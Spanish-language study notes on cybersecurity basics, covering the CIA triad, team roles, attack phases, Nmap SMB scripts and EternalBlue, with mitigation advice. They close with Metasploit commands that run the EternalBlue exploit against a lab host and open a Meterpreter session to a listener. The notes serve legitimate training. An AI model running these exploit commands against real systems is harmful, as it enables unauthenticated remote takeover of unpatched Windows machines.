# Teoría de básicos de ciberseguridad

## Tríada CIA

La tríada CIA es uno de los modelos fundamentales de la ciberseguridad. Su nombre proviene de tres principios: confidencialidad (*Confidentiality*), integridad (*Integrity*) y disponibilidad (*Availability*). Estos conceptos se utilizan para evaluar qué debe proteger un sistema y qué consecuencias tendría un fallo de seguridad.

La **confidencialidad** consiste en garantizar que la información únicamente pueda ser consultada por usuarios, sistemas o procesos autorizados. Para conseguirlo se emplean mecanismos como el control de acceso, la autenticación, los permisos y el cifrado. Por ejemplo, una filtración de una base de datos supone un fallo de confidencialidad, aunque los datos no hayan sido modificados.

La **integridad** garantiza que la información sea correcta y que no pueda ser modificada o eliminada de forma no autorizada. También implica poder detectar alteraciones accidentales o maliciosas. Herramientas como los hashes, las firmas digitales, los controles de acceso o los sistemas de control de versiones ayudan a preservar la integridad. Un atacante que modifica el saldo de una cuenta bancaria sin autorización compromete este principio.

Por último, la **disponibilidad** asegura que la información y los servicios estén accesibles cuando los usuarios autorizados los necesiten. Para ello se utilizan medidas como la redundancia, las copias de seguridad, el balanceo de carga y la protección frente a ataques de denegación de servicio. Un servidor que deja de funcionar debido a un ataque o a un fallo de hardware representa un problema de disponibilidad.

## Equipos Blue y Red

Dentro de la ciberseguridad, el Blue Team y el Red Team representan dos enfoques diferentes pero complementarios. Mientras el Red Team intenta identificar y explotar debilidades desde la perspectiva de un atacante, el Blue Team se encarga de proteger la infraestructura, detectar amenazas y responder ante incidentes.

El **Blue Team** suele ofrecer oportunidades de entrada accesibles. En los puestos iniciales es habitual comenzar como analista de un SOC (*Security Operations Center*), monitorizando alertas generadas por herramientas como un SIEM (*Security Information and Event Management*), un EDR (*Endpoint Detection and Response*) o un IDS (*Intrusion Detection System*). Desde ahí, es posible especializarse en investigación de incidentes, *threat hunting*, análisis de malware o respuesta ante ataques. En los niveles más altos se encuentran puestos como *Incident Response Manager*, *Security Engineer*, *Security Architect* o CISO, responsable de dirigir la estrategia global de seguridad de una organización.

El **Red Team**, por otro lado, está más orientado a la seguridad ofensiva. Un punto de entrada habitual puede ser un puesto de *Junior Pentester*, realizando pruebas de seguridad sobre aplicaciones, redes o sistemas con autorización. Con experiencia, se puede evolucionar hacia puestos de *Pentester*, especialista en seguridad de aplicaciones o *Adversary Simulation*. En los niveles más avanzados se encuentran los *Red Team Operators* y *Red Team Leads*, capaces de simular campañas completas similares a las realizadas por atacantes reales, combinando técnicas de acceso inicial, escalada de privilegios, movimiento lateral y evasión de defensas.

## Fases de un ciberataque

### 1. Reconocimiento

Un ciberataque suele empezar recabando información sobre el objetivo. Esto sirve para encontrar posibles puntos de entrada y vulnerabilidades. La información puede incluir la topología de una red, los puertos abiertos, las versiones de los servicios, las rutas accesibles de una página web e información identificativa de personas que aparezca en páginas públicas.

### 2. Explotación

Una vez obtenida la información necesaria, se pueden intentar explotar las vulnerabilidades encontradas para acceder al sistema. Esto puede implicar ejecutar código controlado por el atacante en la máquina objetivo. Ese código, conocido habitualmente como *payload*, puede introducirse de distintas formas y permite avanzar hacia las siguientes fases del ataque.

### 3. Persistencia

Aunque las máquinas de laboratorio suelen estar diseñadas para resolverse en una sola sesión, en un entorno real un atacante puede intentar mantener el acceso durante varios días, incluso después de reinicios o cambios en la topología de la red. La persistencia proporciona mecanismos para recuperar ese acceso.

### 4. Escalada de privilegios

Muchas veces, al acceder a una máquina, no se dispone de todos los permisos necesarios. En ese caso se buscan vulnerabilidades o configuraciones inseguras que permitan aumentar los privilegios. El nivel máximo de privilegios se conoce como administrador: `root` en Linux y `NT AUTHORITY\\SYSTEM` en Windows.

# Scanning y enumeración

Consulta la [guía completa de Nmap en Herramientas.md](../../Herramientas.md#nmap---network-mapper).

## Scripts NSE para SMB

Los scripts específicos de SMB suelen comenzar por `smb-` o `smb2-`. La disponibilidad de scripts concretos puede variar según la versión instalada de Nmap.

#### Sistema y protocolo

- `smb-os-discovery`: obtiene información del sistema, el nombre del equipo, el dominio o grupo de trabajo y la hora.
- `smb2-capabilities` y `smb2-time`: identifican capacidades de SMBv2/v3 y consultan la hora del host.
- `smb-protocols`: determina las versiones y dialectos SMB soportados.

#### Recursos compartidos, usuarios y sesiones

- `smb-enum-shares`: enumera recursos compartidos y comprueba los permisos disponibles.
- `smb-ls`: inspecciona el contenido de los recursos compartidos accesibles.
- `smb-enum-users`: enumera usuarios locales o de dominio cuando el servicio lo permite.
- `smb-enum-groups`: lista grupos definidos en el sistema o dominio.
- `smb-enum-sessions`: muestra sesiones activas.

#### Configuración y vulnerabilidades

- `smb-security-mode` y `smb2-security-mode`: comprueban la configuración de SMB Signing.
- `smb-vuln-ms17-010`: comprueba si el objetivo puede ser vulnerable a EternalBlue sin explotarlo.
- `smb-vuln-ms08-067`: comprueba la vulnerabilidad MS08-067.

Para consultar los scripts SMB instalados se puede utilizar `ls /usr/share/nmap/scripts/smb*`.

# EternalBlue

## ¿Qué es EternalBlue?

EternalBlue, identificado oficialmente por Microsoft como MS17-010, es un exploit que aprovecha una vulnerabilidad crítica del protocolo SMBv1 en determinados sistemas Windows.

- **Origen:** fue desarrollado originalmente por la NSA.
- **Filtración:** en abril de 2017, el grupo Shadow Brokers publicó la herramienta junto con otros exploits.
- **Impacto global:** contribuyó a ataques de ransomware a gran escala, como WannaCry y NotPetya, en 2017.

## ¿Cómo funciona a alto nivel?

1. **Servicio expuesto:** SMB suele utilizar el puerto TCP 445 y permite compartir archivos e impresoras.
2. **Petición manipulada:** el atacante envía paquetes especialmente construidos al servicio SMBv1.
3. **Corrupción de memoria:** un error en el procesamiento de las peticiones puede provocar corrupción de memoria.
4. **Ejecución remota de código:** en determinadas condiciones, el atacante puede ejecutar código sin disponer de credenciales válidas.

## ¿Por qué es peligrosa?

- **RCE no autenticado:** no requiere credenciales ni interacción del usuario.
- **Privilegios elevados:** una explotación exitosa puede ejecutarse con privilegios de sistema.
- **Capacidad de propagación:** un malware puede buscar automáticamente otros equipos vulnerables de la red.

## Sistemas afectados

La vulnerabilidad afectó a varias versiones de Windows con SMBv1 habilitado, entre ellas Windows XP, Vista, 7, 8, 8.1 y algunas versiones de Windows Server. La lista exacta depende de los boletines y parches aplicados.

## Mitigación y prevención

1. Aplicar el boletín de seguridad MS17-010 y mantener el sistema actualizado.
2. Deshabilitar SMBv1 y utilizar SMBv2 o SMBv3 cuando sea posible.
3. Bloquear el tráfico TCP 445 desde Internet y restringir SMB entre segmentos que no lo necesiten.

# Metasploit

Consulta la [guía completa de Metasploit en Herramientas.md](../../Herramientas.md#metasploit-framework-msfconsole).

Los siguientes ejemplos deben ejecutarse únicamente en máquinas propias o en laboratorios con autorización explícita.

## `smb_version`

Identifica el sistema operativo, el nombre del equipo y la versión del servicio SMB o Samba.

- **Módulo:** `auxiliary/scanner/smb/smb_version`
- **Uso:**

  ```text
  use auxiliary/scanner/smb/smb_version
  set RHOSTS 10.10.10.40
  run
  ```

## `pipe_auditor`

Comprueba qué canales IPC están abiertos a través del recurso compartido `IPC$`, usando sesiones nulas o autenticadas.

- **Módulo:** `auxiliary/scanner/smb/pipe_auditor`
- **Uso:**

  ```text
  use auxiliary/scanner/smb/pipe_auditor
  set RHOSTS 10.10.10.40
  run
  ```

## `ms17_010_eternalblue`

En un laboratorio autorizado, este módulo intenta explotar EternalBlue y puede abrir una sesión de Meterpreter. El resultado depende de la versión del sistema, la arquitectura y la configuración del objetivo.

- **Módulo:** `exploit/windows/smb/ms17_010_eternalblue`
- **Uso:**

  ```text
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS 10.10.10.40
  set LHOST 10.120.134.15
  run
  ```

`LHOST` debe ser la dirección de la interfaz VPN o de red que pueda alcanzar el objetivo, por ejemplo la interfaz `tun0`. En Metasploit, `RHOSTS` identifica el objetivo y `LHOST` la dirección local que recibirá la conexión.

